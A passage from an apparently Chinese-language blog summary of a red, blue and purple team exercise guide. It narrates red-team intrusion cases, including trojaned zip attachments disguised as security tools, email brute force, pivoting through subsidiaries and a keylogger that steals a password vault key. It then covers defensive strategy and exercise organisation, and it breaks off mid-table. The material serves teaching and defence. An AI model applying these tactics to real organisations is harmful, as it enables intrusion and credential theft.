<li>红队通常会采取不同的 Webshell，或利用不同的协议，来建立不同特征的据点。</li>
<li>大部分应急响应过程并不能溯源攻击源头，也未必能分析完整攻击路径，缺乏联动防御。</li>
</ul>
<h2 id="1-4-经典攻击案例"><a href="#1-4-经典攻击案例" class="headerlink" title="1.4 经典攻击案例"></a>1.4 经典攻击案例</h2><h3 id="浑水摸鱼——社工钓鱼突破系统"><a href="#浑水摸鱼——社工钓鱼突破系统" class="headerlink" title="浑水摸鱼——社工钓鱼突破系统"></a>浑水摸鱼——社工钓鱼突破系统</h3><p>【攻击难点】工作目标是某企业的财务系统，通过前期踩点和信息收集发现，目标企业的外网开放系统非常少，也没啥可利用的漏洞，很难通过打点的方式进入到内网。</p>
<p>Step 1：通过网上搜索以及一些开源社工库中收集到一批目标企业的工作人员邮箱列表；</p>
<p>Step 2：制作弱口令字典，通过 hydra 等工具进行爆破，成功破解一名员工的邮箱密码；</p>
<p>Step 3：发现邮箱使用者为 IT 技术部员工，并查看该邮箱发件箱，发现一封历史邮件如下：</p>
<blockquote>
<p>标题：关于员工关掉445端口以及3389端口的操作过程<br>附件：操作流程.zip</p>
</blockquote>
<p>Step 4：在此邮件的基础上进行改造伪装，构造钓鱼邮件如下：</p>
<blockquote>
<p>标题：关于员工关掉445端口以及3389端口的操作补充<br>附件：操作流程补充.zip（带有木马的压缩文件）</p>
</blockquote>
<p>Step 5：通过队对目标企业员工的分析，对几个相关部门进行邮件群发，进而控制了更多的主机与邮箱；</p>
<p>Step 6：在继续构造钓鱼邮件的过程中，发现另一封邮件如下：</p>
<blockquote>
<p>尊敬的各位领导和同事，发现钓鱼邮件事件，内部定义为 19626 事件，请大家注意邮件附件后缀 .exe、.bat等……</p>
</blockquote>
<p>Step 7：继续同样采取<strong>浑水摸鱼策略</strong>，利用以上邮件为母本，以假乱真构造以下邮件继续钓鱼：</p>
<blockquote>
<p>尊敬的各位领导和同事,近期发现大量钓鱼邮件，以下为检测程序……<br>附件：检测程序.zip（带有木马的压缩文件）</p>
</blockquote>
<p>Step 8：通过不断获取更多的邮箱权限与系统权限，根据目标角色针对性设计钓鱼邮件，最终成功拿下目标。</p>
<h3 id="声东击西——混淆流量躲避侦察"><a href="#声东击西——混淆流量躲避侦察" class="headerlink" title="声东击西——混淆流量躲避侦察"></a>声东击西——混淆流量躲避侦察</h3><p>【攻击难点】刚刚创建的跳板几个小时内就被阻断了，刚刚上传的 Webshell 过不了几个小时就被查杀了，蓝队根据流量威胁审计阻断攻击，使得红队始终在目标的外围打转。</p>
<p>Step 1：归纳分析了流量威胁审计的天然弱点，以及蓝队有可能出现的人员数量及技术能力不足等情况，决定采用<strong>声东击西策略</strong>：</p>
<blockquote>
<p>同时寻找多个具有直接获取权限漏洞的系统，<strong>正面大流量进攻某个系统，吸引火力，侧面尽量减少流量直接拿权限并快速突破内网</strong>。</p>
</blockquote>
<p>Step 2：通过信息搜集，发现目标企业的某个外网 Web 应用，并通过代码审计发现多个严重的漏洞，还发现了该企业的一个营销网站，并通过黑盒测试发现存在文件上传漏洞；</p>
<p>Step 3：大部分成员主攻营销网站，不在乎是否被发现或封堵，目的是让吸引蓝队注意力，使其忙于分析和应对正面的大流量攻击；</p>
<p>Step 4：小部分成员利用不同的 IP 和浏览器指纹特征渗透 Web 应用网站，目的是用最少的流量拿下服务器，让威胁数据淹没在营销网站的攻击洪水当中。</p>
<h3 id="李代桃僵——旁路攻击搞定目标"><a href="#李代桃僵——旁路攻击搞定目标" class="headerlink" title="李代桃僵——旁路攻击搞定目标"></a>李代桃僵——旁路攻击搞定目标</h3><p>【攻击难点】蓝队将网站首页替换成了一张截图；或将所有数据传输接口关闭了，然后采用 Excel 表格的方式实现数据导入；或将内网目标系统的 IP 做了限定，仅允许某个管理员 IP 访问等。</p>
<p>Step 1： 通过信息搜集，发现目标企业把能关的外网系统都关了，甚至连邮件系统都做了策略，决定采用<strong>李代桃僵策略</strong>：</p>
<blockquote>
<p><strong>如果母公司不让搞，那就去搞子公司；如果子公司不让搞，那就去搞孙公司。</strong></p>
</blockquote>
<p>Step 2：从目标的孙公司 A 下手，利用 SQL 注入与命令执行漏洞，成功进入其 DMZ 区；</p>
<p>Step 3：继续横向渗透控制了 A 的域控与 DMZ 服务器，并未发现目标系统信息，但发现 A 可连通子公司 B；</p>
<p>Step 4：通过 Tomcat 弱口令与上传漏洞进入 B 的内网，继续横向渗透获取了 B 的域控；</p>
<p>Step 5：对 B 进行信息收集，发现目标系统 X 托管在子公司 C，并且 B 内有 7 名员工与 X 存在业务往来，大部分时间在 C 内办公，但其电脑资产属于 B 的域；</p>
<p>Step 6：当 7 名员工的电脑接入 B 的内网时，利用域权限在其电脑种植木马后门；</p>
<p>Step 7：当 7 名员工的电脑接入 C 的内网时，通过其计算机实施横向渗透，并获取了 C 的域控；</p>
<p>Step 8：通过日志分析，锁定了 X 的管理员电脑，并获取了 X 的管理员登陆账号，最终获取 X 的控制权限。</p>
<h3 id="顺手牵羊——巧妙种马实施控制"><a href="#顺手牵羊——巧妙种马实施控制" class="headerlink" title="顺手牵羊——巧妙种马实施控制"></a>顺手牵羊——巧妙种马实施控制</h3><p>【攻击难点】红队的工作永远是具有随机性、挑战性、对抗性的，总会有各种出其不意的情况出现，只有随机应变、充分利用出现的各种机遇，才能最终突破目标完成任务。</p>
<p>Step 1：红队通过挖掘目标 OA 系统的 0day 漏洞，拿到了 Webshell，但管理员很快发现 OA 系统存在异常，及时迁移了 OA 系统应用与数据库，并修复了漏洞；</p>
<p>Step 2：经测试发现，<strong>蓝队虽然迁移了系统并修复了漏洞，但未删除全部 Webshell 后门脚本</strong>，红队仍能连接之前的 Webshell；</p>
<p>Step 3：通过提权获得服务器权限后，发现蓝队管理员连接到了 OA 服务器，并将其 PC 的磁盘全部挂载到 OA 服务器中；</p>
<p>Step 4：确认了管理员身份与远程磁盘文件后，向磁盘写入了自启后门程序；</p>
<p>Step 5：待蓝队管理员重启 PC 后，红队获得 PC 权限，并发现管理员使用 MyBase 工具加密存储服务器的重要信息；</p>
<p>Step 6：通过键盘记录器，获取了 MyBase 主密钥，解密文件后获取了 VPN、堡垒机、虚拟化管理平台等关键系统的账户密码；</p>
<p>Step 7：红队利用获取到的账户密码登录到虚拟化平台中，定位到演习目标系统的虚拟主机，并顺利获取了管理员权限。</p>
<h3 id="暗渡陈仓——迂回渗透取得突破"><a href="#暗渡陈仓——迂回渗透取得突破" class="headerlink" title="暗渡陈仓——迂回渗透取得突破"></a>暗渡陈仓——迂回渗透取得突破</h3><p>【攻击难点】当演习中明确了重点目标，蓝队通常会严防死守、严阵以待，时时刻刻盯着从外网进来的所有流量，不管你攻还是不攻，他们始终坚守在那里。</p>
<p>Step 1：通过信息搜集，发现大多数目标要么都已关闭，要么使用了高强度的防护设备，在时间有限情况下，红队放弃正面突破，决定采用<strong>暗度陈仓策略</strong>：</p>
<blockquote>
<p><strong>绕过蓝队的防守线，从其他没有防守的地方去开展迂回攻击。</strong></p>
</blockquote>
<p>Step 2：通过天眼查网站，红队了解到所有子公司及附属业务的分布情况，目标业务遍布世界各地，其中香港包涵业务相对较多，很可能有互相传送数据及办公协同的内网，故决定以香港作为切入点；</p>
<p>Step 3：通过踩点刺探，在香港酒店业务网站找到一个 SA 权限的注入点，成功登陆后台后，利用任意文件上传漏洞 Getshell；</p>
<p>Step 4：通过数据库 SA 权限，获取数据库服务器的 SYSTEM 权限，并导出了域 Hash 及域结构；</p>
<p>Step 5：在导出的域结构中，发现了国内域的机器，于是红队开始尝试向目标所在的国内域开展横向渗透，并成功对一台服务器 Getshell，提权后抓取此服务器密码；</p>
<p>Step 6：利用抓取到的密码尝试登陆其他服务器，并成功登陆到一台杀毒服务器；</p>
<p>Step 7：在杀毒服务器上成功抓到国内域的域管密码，并使用域管账号成功控制堡垒机、运维管理、VPN 等多个重要系统。</p>
<h2 id="1-5-常见防守弱点"><a href="#1-5-常见防守弱点" class="headerlink" title="1.5 常见防守弱点"></a>1.5 常见防守弱点</h2><h3 id="资产混乱、隔离策略不严格"><a href="#资产混乱、隔离策略不严格" class="headerlink" title="资产混乱、隔离策略不严格"></a>资产混乱、隔离策略不严格</h3><ul>
<li>除了大型银行之外，很多企业对自身资产的管理比较混乱，没有严格的访问控制策略（ACL，Access Control List），并且办公网和互联网之间大部分相通，并能直接通过远控程序上线。</li>
<li>除了大型银行与互联网企业外，很多企业在 DMZ 区和办公网之间不做或很少做隔离，网络区域划分也不严格。</li>
<li>此外，几乎所有企业的下级单位和上级单位的业务网都可以互通。</li>
</ul>
<h3 id="通用中间件未修复漏洞较多"><a href="#通用中间件未修复漏洞较多" class="headerlink" title="通用中间件未修复漏洞较多"></a>通用中间件未修复漏洞较多</h3><ul>
<li>WebLogic 应用较为广泛，其反序列化漏洞常会被作为打点和内网渗透的突破点。</li>
<li>大部分企业都有对外开放的邮件系统，可以针对邮件系统漏洞开展攻击（如跨站漏洞、XXE 漏洞等），也可以通过钓鱼邮件和鱼叉攻击开展社工活动。</li>
</ul>
<h3 id="边界设备成为进入内网的缺口"><a href="#边界设备成为进入内网的缺口" class="headerlink" title="边界设备成为进入内网的缺口"></a>边界设备成为进入内网的缺口</h3><ul>
<li>大部分企业都会搭建 VPN 设备，可以针对 VPN 设备的漏洞开展攻击（如 SQL 注入、添加账号、远程命令执行等），也可以采取钓鱼、爆破、弱口令等方式来获取账号权限。</li>
</ul>
<h3 id="内网管理设备成扩大战果突破点"><a href="#内网管理设备成扩大战果突破点" class="headerlink" title="内网管理设备成扩大战果突破点"></a>内网管理设备成扩大战果突破点</h3><ul>
<li>大部分企业都有堡垒机、自动化运维、虚拟化、邮件系统和域环境等内网管理设备，但由于缺乏定期维护升级，很可能作为扩大权限的突破点。</li>
</ul>
<h1 id="0x02-蓝队视角下的防御体系构建"><a href="#0x02-蓝队视角下的防御体系构建" class="headerlink" title="0x02 蓝队视角下的防御体系构建"></a>0x02 蓝队视角下的防御体系构建</h1><h2 id="2-1-什么是蓝队"><a href="#2-1-什么是蓝队" class="headerlink" title="2.1 什么是蓝队"></a>2.1 什么是蓝队</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li>释义：蓝队通常指网络实战攻防演习中的<strong>防守方</strong>。</li>
<li>职责：蓝队主要工作包括<strong>前期</strong>安全检查、整改与加固，<strong>演习期间</strong>进行网络安全监测、预警、分析、验证、处置，<strong>后期</strong>复盘总结现有防护工作中的不足之处，为后续常态化的网络安全防护措施提供优化依据。</li>
</ul>
<h3 id="团队组成"><a href="#团队组成" class="headerlink" title="团队组成"></a>团队组成</h3><p>蓝队并不仅仅由实战演习中目标系统运营单位一家独立承担，而是由<strong>目标系统运营单位、攻防专家、安全厂商、软件开发商、网络运维队伍、云提供商</strong>等多方组成的防守队伍（若还有其他团队角色，则根据实际情况分配工作）。</p>
<table>
<thead>
<tr>
<th>角色</th>
<th>分工</th>
</tr>
</thead>
<tbody><tr>
<td>目标系统运营单位</td>
<td>负责蓝队整体的指挥、组织和协调</td>
</tr>
<tr>
<td>安全运营团队</td>
<td>负责整体防护和攻击监控工作</td>
</tr>
<tr>
<td>攻防专家</td>
<td>负责分析研判可疑攻击，指导相关部门漏洞整改</td>
</tr>
<tr>
<td>安全厂商</td>
<td>负责调整自身产品的可用性、可靠性和防护监控策略</td>
</tr>
<tr>
<td>软件开发商</td>
<td>负责加固与监控自身系统，配合攻防专家整改安全问题</td>
</tr>
<tr>
<td>网络运维队伍</td>
<td>负责网络架构安全保障、出口整体优化、网络监控与溯源</td>
</tr>
<tr>
<td>云提供商</td>
<td>负责保障自身云系统的安全性，配合攻防专家整改安全问题</td>
</tr>
</tbody></table>
<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><ul>
<li>实战攻防演习过程中，蓝队通常会<strong>在日常安全运维工作的基础上，以实战思维进一步加强安全防护措施</strong>、提升管理组织规格、扩大威胁监控范围、完善监测与防护手段、增加安全分析频率、提高应急响应速度，提升防守能力。</li>
<li>蓝队必须站在攻击者的角度，<strong>了解攻击者的思路与打法，并结合本单位的实际网络环境与运营管理情况，制定相应的防御策略与响应机制</strong>，才能在防守过程中争取主动权。</li>
</ul>
<h2 id="2-2-蓝队防守三步走"><a href="#2-2-蓝队防守三步走" class="headerlink" title="2.2 蓝队防守三步走"></a>2.2 蓝队防守三步走</h2><h3 id="第一阶段：备战阶段"><a href="#第一阶段：备战阶段" class="headerlink" title="第一阶段：备战阶段"></a>第一阶段：备战阶段</h3><p>首先应当从<strong>技术、管理、运营</strong>三个层面进行安全评估及改进。</p>
<table>
<thead>
<tr>
<th>层面</th>
<th>存在问题</th>
<th>解决方法</th>
</tr>
</thead>
<tbody><tr>
<td>技术</td>
<td>基础能力薄弱、安全策略不当、安全措施不完善等</td>
<td>系统资产梳理、安全基线检查、网络安全策略检查、Web 安全检测、关键网络安全风险检查、安全措施梳理和完善、应急预案完善与演练等</td>
</tr>
<tr>
<td>管理</td>
<td>制度缺失、职责不明、应急响应机制不完善等</td>
<td>建立合理的安全组织架构、建立有效的工作沟通机制等</td>
</tr>
<tr>
<td>运营</td>
<td>资产梳理不清晰、漏洞整改不彻底、安全监测分析与处置能力不足等</td>
<td>成立防护运营小组，提高安全监测、预警、分析、验证、处置等能力，以全流量安全威胁检测分析为重点</td>
</tr>
</tbody></table>
<h3 id="第二阶段：实战阶段"><a href="#第二阶段：实战阶段" class="headerlink" title="第二阶段：实战阶段"></a>第二阶段：实战阶段</h3><p>Step 1：<strong>做好全局性分析研判工作</strong>，对监测人员发现的攻击预警进行分析确认并溯源，并指导协助事件处置人员<br>对确认的攻击进行处置。</p>
<p>Step 2：<strong>全面布局安全监测预警</strong>，尽量做到全面覆盖（网络边界、内网区域、应用系统、主机系统等），只要不影响业务，监测手段越多元化越好（IDS、WAF、全流量威胁检测、网络分析系统、蜜罐等）。</p>
<p>Step 3：<strong>提高事件处置效率效果</strong>，应在最短时间内采取技术手段遏制攻击、防止蔓延。</p>
<h3 id="第三阶段：战后整顿"><a href="#第三阶段：战后整顿" class="headerlink" title="第三阶段：战后整顿"></a>第三阶段：战后整顿</h3><p>最后应<strong>全面复盘分析</strong>实战防护工作，并总结经验教训。通过日常网络安全建设和安全运营的日积月累，不断优化企业安全的技术、管理、运营体系，形成面向实战的安全防御能力。</p>
<table>
<thead>
<tr>
<th>分析角度</th>
<th>具体内容</th>
</tr>
</thead>
<tbody><tr>
<td>复盘环节</td>
<td>备战、预演习、实战等环节</td>
</tr>
<tr>
<td>复查层面</td>
<td>工作方案、组织管理、工作启动会、系统资产梳理、安全自查及优化、基础安全监测防护设备的部署、安全意识、应急预案、注意事项等</td>
</tr>
<tr>
<td>整改方向</td>
<td>管理层面不完善的制度、技术层面需优化的安全措施和策略、协调工作层面低下的效率、人员队伍需提高的技术能力等</td>
</tr>
</tbody></table>
<h2 id="2-3-常用防守策略"><a href="#2-3-常用防守策略" class="headerlink" title="2.3 常用防守策略"></a>2.3 常用防守策略</h2><h3 id="防微杜渐：防范被踩点"><a href="#防微杜渐：防范被踩点" class="headerlink" title="防微杜渐：防范被踩点"></a>防微杜渐：防范被踩点</h3><ul>
<li>要尽量<strong>防止本单位敏感信息泄露在公共信息平台</strong>，并定期排查是否存在敏感文件泄露的情况。</li>
<li>要定期<strong>对信息部门重要人员进行安全意识培训</strong>，如：来路不明的邮件附件不要随便点开，社交软件未经身份确认不要随便添加好友。</li>
</ul>
<h3 id="收缩战线：收敛攻击面"><a href="#收缩战线：收敛攻击面" class="headerlink" title="收缩战线：收敛攻击面"></a>收缩战线：收敛攻击面</h3><ul>
<li>要定期梳理本单位的网络边界、可能被攻击的路径，尤其是内部系统全国联网的单位。</li>
<li>要定期检测开放在互联网的管理后台、开放在互联网上的测试系统、无人维护的僵尸系统、拟下线而未下线的系统、因疏漏而未纳入防护范围的互联网开放系统。</li>
<li>要定期梳理外部单位的网络接入情况（供应商、下级单位、业务合作单位等），尤其是未经过安全防护设备就直连内网的单位。</li>
<li>要定期梳理 Web 服务的 API 隐藏接口、不用的 VPN、WiFi 账号等。</li>
</ul>
<h3 id="纵深防御：立体防渗透"><a href="#纵深防御：立体防渗透" class="headerlink" title="纵深防御：立体防渗透"></a>纵深防御：立体防渗透</h3><ul>
<li><strong>互联网端防护【</strong>最外部的接口，是重点防护区域】：需部署的网络防护设备（WAF、IPS、NGFW、防病毒网关、全流量分析设备、防垃圾邮件网关等），并事先对互联网系统进行一次完整的渗透测试。</li>
<li><strong>访问控制措施</strong>【阻止横向渗透最简单有效的防护手段】：依据最小权限原则，只给必须使用的用户开放访问权限，禁止私自开放服务或者内部全通等情况出现。</li>
<li><strong>主机防护</strong>【直接决定了内网攻击成果的大小】：关闭没用的服务、修改主机弱口令、高危漏洞必须打补丁（包括装在系统上的软件高危漏洞）、安装主机和服务器安全软件、开启日志审计等。</li>
<li><strong>集权系统</strong>【内部防护的重中之重】：要在系统配置安全、系统安全测试、访问控制策略、弱口令设置、已知漏洞的加固情况等方面做好集权系统的防护。</li>
<li><strong>无线网络</strong>【可能成为攻击点】：无线开放网络应与业务网络分开，并建议采用强认证与强加密接入模式。</li>
<li><strong>外部接入网络</strong>【可能被旁路攻击】：对外部业务系统进行安全检测，并确保先接入安全防护设备，再连接内网。</li>
</ul>
<h3 id="守护核心：找到关键点"><a href="#守护核心：找到关键点" class="headerlink" title="守护核心：找到关键点"></a>守护核心：找到关键点</h3><ul>
<li>要重点梳理核心目标系统与哪些业务系统有联系、有哪些开放的服务或接口、是哪种传输方式等。</li>
<li>对核心目标系统做一次交叉渗透测试，充分检验系统的安全性。</li>
<li>对核心目标系统的出入流量、中间件日志进行安全监控和分析。</li>
</ul>
<h3 id="洞若观火：全方位监控"><a href="#洞若观火：全方位监控" class="headerlink" title="洞若观火：全方位监控"></a>洞若观火：全方位监控</h3><ul>
<li><strong>通过全网络流量去捕获攻击行为</strong>是目前最有效的安全监控方式。</li>
<li><strong>通过合理部署主机安全软件</strong>，可以更快速准确地找到攻击者的真实目标主机。</li>
<li><strong>要建立一套独立的日志分析和存储机制</strong>，核心目标系统可派专人监控分析恶意行为。</li>
<li><strong>通过与专业安全厂商合作，建立漏洞通报机制</strong>，安全厂商负责检测与防守单位信息资产相关的 0day 或 Nday 漏洞，并及时将漏洞向防守单位通报。</li>
</ul>
<h2 id="2-4-建立实战化的安全体系"><a href="#2-4-建立实战化的安全体系" class="headerlink" title="2.4 建立实战化的安全体系"></a>2.4 建立实战化的安全体系</h2><h3 id="认证机制逐步向零信任架构演进"><a href="#认证机制逐步向零信任架构演进" class="headerlink" title="认证机制逐步向零信任架构演进"></a>认证机制逐步向零信任架构演进</h3><ul>
<li>传统网络安全边界正在被瓦解，攻击手段层出不穷，零信任安全思想认为<strong>网络是不可信任的</strong>，并提出实战防御的关注点应从“攻击面”向“保护面”上转移（可类比从“黑名单”转向“白名单”）。</li>
<li>零信任安全架构引导从网络中心化走向身份中心化，其本质诉求是<strong>以身份为中心</strong>进行访问控制。</li>
<li>零信任安全<strong>核心思想</strong>：默认情况下不应该信任网络内部和外部的任何人、设备和系统，必须基于认证和授权重构访问控制的信任基础。</li>
<li>零信任安全<strong>遵循原则</strong>：先验证身份（不再自动信任内部和外部的任何人、设备和系统），后授权访问（满足最小权限原则）。</li>
<li>零信任安全<strong>架构优点</strong>：（1）以安全与易用平衡的持续认证，改进了原有固化的一次性强认证；（2）以基于风险和信任持续度量的动态授权，替代了简单的二值判定静态授权；（3）以开放智能的身份治理，优化了封闭僵化的身份管理。</li>
</ul>
<h3 id="建立面向实战的纵深防御体系"><a href="#建立面向实战的纵深防御体系" class="headerlink" title="建立面向实战的纵深防御体系"></a>建立面向实战的纵深防御体系</h3><ul>
<li>随着云计算、大数据、人工智能等新型技术的广泛应用，传统安全思路难以保障更加复杂的信息基础架构，必须通过新思路、新技术、新方法<strong>建立纵深防御体系架构</strong>，提升面向实战的整体防护能力。</li>
<li>先梳理现有的安全架构，再以安全能力建设为核心思路，重新设计企业纵深防御体系架构，并努力将安全工作前移，确保安全与信息化<strong>“三同步”（同步规划、同步建设、同步使用）</strong>。</li>
</ul>
<h3 id="强化行之有效的威胁监测手段"><a href="#强化行之有效的威胁监测手段" class="headerlink" title="强化行之有效的威胁监测手段"></a>强化行之有效的威胁监测手段</h3><ul>
<li>威胁监测手段存在的常见问题：（1）<strong>未针对全流量威胁进行监测</strong>，导致分析溯源工作无法开展；（2）即使有全流量威胁监测手段，但<strong>流量覆盖不完全</strong>，存在监测盲区；（3）只关注网络监测，<strong>忽视主机层面的监测</strong>，当主机发生异常时不易察觉；（4）<strong>缺乏对邮件安全的监测</strong>，使得钓鱼邮件，恶意附件在网络中畅通无阻；（5）没有变被动为主动，<strong>缺乏蜜罐等技术手段</strong>，无法捕获攻击、进一步分析攻击行为。</li>
<li>强化威胁监测手段方法：建立以全流量威胁监测分析为“大脑”、以主机监测与邮件安全监测为“触角”、以蜜罐监测为“陷阱”、以失陷检测为辅助手段的<strong>全方位安全监测机制</strong>。</li>
</ul>
<h3 id="建立闭环的安全运营模式"><a href="#建立闭环的安全运营模式" class="headerlink" title="建立闭环的安全运营模式"></a>建立闭环的安全运营模式</h3><ul>
<li>通过内部威胁预测、外部威胁情报共享、定期开展暴露资产发现、安全检查等工作，达到<strong>攻击预测，提前预防</strong>的目的。</li>
<li>通过开展安全策略优化、安全基线评估加固、系统上线安全检查、安全产品运行维护等工作，建立<strong>威胁防护</strong>能力。</li>
<li>通过全流量风险分析、应用失陷检测、渗透测试、蜜罐诱导等手段，对安全事件能进行<strong>持续检测</strong>，减少威胁停留时间。</li>
<li>通过开展实战攻防演习、安全事件研判分析、规范安全事件处置流程等工作，对安全事件及时进行控制，降低危害影响，形成<strong>快速响应处置机制</strong>。</li>
<li>配备专人来完成监控、分析、响应、处置等重要环节的工作，在日常工作中让所有参与人员都能熟悉工作流程，并提高<strong>团队协同作战</strong>能力。</li>
<li>企业应重视安全防御体系的建设，建立起<strong>“以人员为核心、以数据为基础、以运营为手段”</strong>的安全运营模式，逐步形成威胁预测、威胁防护、持续检测、响应处置的闭环安全工作流程，打造<strong>“四位一体”</strong>的闭环安全运营体系。</li>
</ul>
<h1 id="0x03-紫队视角下的实战攻防演习组织"><a href="#0x03-紫队视角下的实战攻防演习组织" class="headerlink" title="0x03 紫队视角下的实战攻防演习组织"></a>0x03 紫队视角下的实战攻防演习组织</h1><h2 id="3-1-什么是紫队"><a href="#3-1-什么是紫队" class="headerlink" title="3.1 什么是紫队"></a>3.1 什么是紫队</h2><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li>释义：紫队通常指网络实战攻防演习中的<strong>组织方</strong>。</li>
<li>职责：紫队主要负责组织协调实战演习的开展工作，包括<strong>演习组织、过程监控、技术指导、应急保障、演习总结、技术措施与策略优化建议</strong>等，目的是通过演习检验参演单位的<strong>安全威胁应对能力、攻击事件检测发现能力、事件分析研判能力与事件响应处置能力</strong>，以提升参演单位的安全实战能力。</li>
</ul>
<h3 id="实战攻防演习组织要素"><a href="#实战攻防演习组织要素" class="headerlink" title="实战攻防演习组织要素"></a>实战攻防演习组织要素</h3><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/summary-of-practical-tripple-guide-of-attack-and-defense-by-qianxin/elements.png" alt="elements"></p>
<table>
<thead>
<tr>
<th>要素</th>
<th>职责</th>
</tr>
</thead>
<tbody><tr>
<td>组织单位</td>
<td>负责总体把控、资源协调、演习准备、演习组织、演习总结、落实整改等相关工作</td>
</tr>
<tr>
<td>演习技术支撑单位</td>
<td>实战攻防演习的环境搭建与可视化展示</td>
</tr>
<tr>
<td>攻击方（红队）</td>
<td>由多家安全厂商独立组队，每队配备 3 至 5 人<br/>攻击以资产探查、工具扫描与人工渗透为主，目的是获取演习目标系统权限和数据</td>
</tr>
<tr>
<td>防守方（蓝队）</td>
<td>由参演单位与相关厂商组成的防守团队<br/>负责所管辖资产的防御工作，尽可能地避免被红队拿到权限和数据</td>
</tr>
</tbody></table>
<h3 id="实战攻防演习组织形式"><a href="#实战攻防演习组织形式" class="headerlink" title="实战攻防演习组织形式"></a>实战攻防演习组织形式</h3><table>
<thead>
<tr>
<th>形式</th>
<th>范围</th>
<th>目标</th>
</tr>
</thead>
<tbody><tr>
<td>由国家、行业主管部门、监管机构组织</td>
<td>公安机关、网信部门、政府、金融、交通、卫生、教育、电力、运营商等</td>
<td>针对行业关键信息基础设施和重要系统</td>
</tr>
<tr>
<td>由大型企事业单位自行组织</td>
<td>央企、银行、金融企业、运营商、行政机构、事业单位、其他政企单位等</td>
<td>针对业务安全防御体系建设有效性的验证需求</td>
</tr>
</tbody></table>
<h3 id="实战攻防演习组织关键"><a href="#实战攻防演习组织关键" class="headerlink" title="实战攻防演习组织关键"></a>实战攻防演习组织关键</h3><table>
<thead>
<tr>
<th>关键</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>演习范围</td>
<td>优先选择重点且非涉密的关键业务系统及网络</td>
</tr>
<tr>
<td>演习周期</td>
<td>结合实际业务开展，一般建议 1 至 2 周</td>
</tr>
<tr>
<td>演习场地</td>
<td>依据演习规模选择相应的场地，一般将组织方、攻击方、防守方的场地分开</td>
</tr>
<tr>
<td>演习设备</td>
<td>搭建攻防演习平台与视频监控系统，配发攻击方专用电脑</td>
</tr>
<tr>
<td>攻击方组建</td>
<td>由参演单位安全技术人员或安全厂商专业人员组建</td>
</tr>
<tr>
<td>防守队组建</td>
<td>以参演单位安全技术人员为主，以安全厂商专业人员为辅</td>
</tr>
<tr>
<td>演习规则制定</td>
<td>明确制定攻击规则、防守规则与评分规则，保证攻防过程有理有据，避免攻击过程影响业务正常运行</td>
</tr>
<tr>
<td>演习视频录制</td>
<td>录制演习全过程的视频，内容包括前期工作准备、红队攻击过程、蓝队防守过程、紫队评分过程等</td>
</tr>
</tbody></table>
<h2 id="3-2-紫队组织四阶段"><a href="#3-2-紫队组织四阶段" class="headerlink" title="3.2 紫队组织四阶段"></a>3.2 紫队组织四阶段</h2><table>
<thead>
<tr>
<th>阶段</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>组织策划</td>
<td>明确演习最终目标，策划演习各项工作，提出合理可用的实战攻防演习方案</td>
</tr>
<tr>
<td>前期准备</td>
<td>依据实施方案落实人员与物资</td>
</tr>
<tr>
<td>实战攻防演习</td>
<td>由组织方协调攻防两方及其他参演单位完成演习工作，包括演习启动、演习过程、演习保障等</td>
</tr>
<tr>
<td>演习总结</td>
<td>先恢复所有业务系统至日常运行状态，再进行工作成果汇总，为后期整改建设提供依据</td>
</tr>
</tbody></table>
<h3 id="第一阶段：组织策划"><a href="#第一阶段：组织策划" class="headerlink" title="第一阶段：组织策划"></a>第一阶段：组织策划</h3><p>Step 1：<strong>建立演习组织</strong></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/summary-of-practical-tripple-guide-of-attack-and-defense-by-qianxin/organization.png" alt="organization"></p>
<table>
<thead>
<tr>
<th>组别</th>
<th>职责</th>
</tr>
</thead>
<tbody><tr>
<td>攻击组（红队）</td>
<td>由参演单位与安全厂商共同组建，一般由攻防渗透、代码审计等技术人员组成<br/>负责攻击演习目标</td>
</tr>
<tr>
<td>防守组（蓝队）</td>
<td>由防守单位的运维技术、安全运营等人员组成<br/>负责监测演习目标，发现并遏制攻击行为</td>
</tr>
<tr>
<td>技术支撑组</td>
<td>由组织单位的系统及网络运维人员组成<br/>负责演习过程中的实时状态监控、阻断处置操作等，保障演习环境与监控平台正常运行、演习过程安全有序地开展</td>
</tr>
<tr>
<td>监督评价组</td>
<td>由主导单位专业人员组成专家组与裁判组<br/>专家组负责研究演习方案，把控攻击效果，研判攻击成果，保障演习安全可控<br/>裁判组负责巡查演习过程中的攻击状态与防守状态，把控攻击方操作，对攻击成果判定相应分数，最终对参演攻击组与防守组给予排名</td>
</tr>
<tr>
<td>组织保障组</td>
<td>由组织单位的后勤人员组成<br/>负责演习过程中的协调联络、后勤保障等相关事宜，包括演习应急响应保障、演习场地保障、演习视频采集等</td>
</tr>
</tbody></table>
<p>Step 2：<strong>确定演习目标</strong></p>
<ul>
<li>依据预想的演习效果，全面梳理参演单位的业务和信息系统，并由组织单位选定或由参演单位上报，最终确定演习目标系统。</li>
<li>一般会选择关键信息基础设施、重要业务系统、门户网站等作为演习首选目标。</li>
</ul>
<p>Step 3：<strong>制定演习规则</strong></p>
<ul>
<li>依据演习目标，结合实际场景，细化攻击规则、防守规则与评分规则。</li>
<li>为了激励防守单位、提升防守技术能力，可适当增加防守反击得分规则。</li>
<li>演习时间通常为工作日 5 × 8 小时，组织单位视情况还可以安排为 7 × 24 小时。</li>
<li>沟通方式通常为即时通信软件、邮件、电话等。</li>
</ul>
<p>Step 4：<strong>确定演习流程</strong></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/summary-of-practical-tripple-guide-of-attack-and-defense-by-qianxin/process.png" alt="process"></p>
<table>
<thead>
<tr>
<th>流程</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>确认人员就位</td>
<td>确认红队人员、蓝队人员、紫队人员按要求到位</td>
</tr>
<tr>
<td>确认演习环境</td>
<td>攻击组与技术支撑组确认演习现场与演习平台准备就绪</td>
</tr>
<tr>
<td>确认准备工作</td>
<td>防守组确认演习目标系统是否正常运行、是否已完整备份</td>
</tr>
<tr>
<td>演习开始</td>
<td>各组确认准备完毕，演习正式开始</td>
</tr>
<tr>
<td>攻击组实施攻击</td>
<td>红队对目标系统实施网络攻击，记录攻击过程与成果证据</td>
</tr>
<tr>
